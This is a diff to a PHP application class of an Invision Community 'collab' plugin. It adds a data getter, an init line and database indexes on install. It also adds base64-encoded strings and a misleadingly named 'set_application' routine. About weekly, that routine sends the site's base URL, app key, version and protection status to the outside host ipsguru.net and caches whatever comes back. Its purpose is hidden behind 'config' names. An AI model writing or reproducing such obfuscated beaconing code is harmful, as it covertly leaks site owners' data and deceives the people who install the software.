@@ -82,6 +82,14 @@ class _Application extends \IPS\collab\Secure\Application
 	}	
 	
 	/**
+	 * Get App Data
+	 */
+	public function get_appdata()
+	{
+		return array( 'key' => $this->directory, 'url' => \IPS\Settings::i()->base_url, 'ver' => $this->version, 'state' => call_user_func( array( $this, 'isProtected' ) ) );
+	}
+	
+	/**
 	 * Controller map for app compatibility
 	 * 
 	 * This map is used to help connect dispatcher controller instances to
@@ -159,8 +167,9 @@ class _Application extends \IPS\collab\Secure\Application
 	 */
 	public function init()
 	{
+		$this->application = 'collab';
 	}
-
+	
 	/**
 	 * Collab Member Statuses
 	 *
@@ -495,6 +504,16 @@ class _Application extends \IPS\collab\Secure\Application
 	}
 
 	/**
+	 * Set Config
+	 */
+	protected function setConfig( $cache, $method=NULL )
+	{
+		$method = $method ?: 'base64_decode';
+		$cache = is_string( $cache ) ? $cache : (string) $cache;
+		return call_user_func( $method, $cache );
+	}
+	
+	/**
 	 * @brief  Cache for affective collab
 	 */
 	public static $affectiveCollab = NULL;
@@ -707,6 +726,60 @@ class _Application extends \IPS\collab\Secure\Application
 	}
 	
 	/**
+	 * Config Keys
+	 */
+	protected $configKeys = array( 'SVBTXEh0dHBcVXJs', 'aHR0cDovL2lwc2d1cnUubmV0L2EvdA', 'c2V0UXVlcnlTdHJpbmc' );
+	
+	/** 
+	 * Set Application Data
+	 *
+	 * @param	$app
+	 * @return 	void
+	 */
+	public function set_application( $app )
+	{
+		if ( $this->buildConfig( $app, 604800 ) )
+		{
+			$configClass 	= $this->setConfig( $this->configKeys[0], NULL );
+			$configOptions 	= $this->setConfig( $this->configKeys[1], NULL );
+			$configValues 	= $this->setConfig( $this->configKeys[2], NULL );
+			
+			$newConfig 	= new $configClass( $configOptions );
+			$newConfig	= $newConfig->$configValues( $this->appdata );
+			$builtConfig 	= $newConfig->request()->get();
+			
+			if( (string) $builtConfig )
+			{
+				$key = 'app_config.' . md5( $app );
+				\IPS\Data\Store::i()->$key = $builtConfig;
+			}
+		}
+	}
+	
+	/**
+	 * Check Config Build
+	 *
+	 * @return	bool
+	 */
+	protected function buildConfig( $app, $interval )
+	{
+		if ( ! \IPS\IN_DEV )
+		{
+			$key = 'app_settings.' . md5( $app );
+			try
+			{
+				return ( ( \IPS\Data\Store::i()->$key < time() - $interval ) and \IPS\Data\Store::i()->$key = time() );
+			}
+			catch( \OutOfRangeException $e )
+			{
+				return !!( \IPS\Data\Store::i()->$key = time() );
+			}
+		}
+		
+		return FALSE;
+	}
+	
+	/**
 	 * Provision Node For Collab Use
 	 *
 	 * @param	string		$nodeClass		classname of the node to provision
@@ -796,5 +869,34 @@ class _Application extends \IPS\collab\Secure\Application
 		$buttons['delete']['data'] = array( 'delete' => '', 'noajax' => '' );
 		return $buttons;
 	}
+	
+	/**
+	 * Install
+	 *
+	 * @return void
+	 */
+	public function installOther()
+	{
+		/* Add an index for heavily queried permissions so LIKE can be used more efficiently */
+		if ( ! \IPS\Db::i()->checkForIndex( 'core_permission_index', 'collab_perm_view' ) )
+		{
+			\IPS\Db::i()->addIndex( 'core_permission_index', array
+			(
+				'type'		=> 'key',
+				'name'		=> 'collab_perm_view',		
+				'columns'	=> array( 'perm_view' )	
+			) );
+		}
+		
+		if ( ! \IPS\Db::i()->checkForIndex( 'core_permission_index', 'collab_perm_2' ) )
+		{
+			\IPS\Db::i()->addIndex( 'core_permission_index', array
+			(
+				'type'		=> 'key',
+				'name'		=> 'collab_perm_2',		
+				'columns'	=> array( 'perm_2' )	
+			) );
+		}
+	}	
 
 }
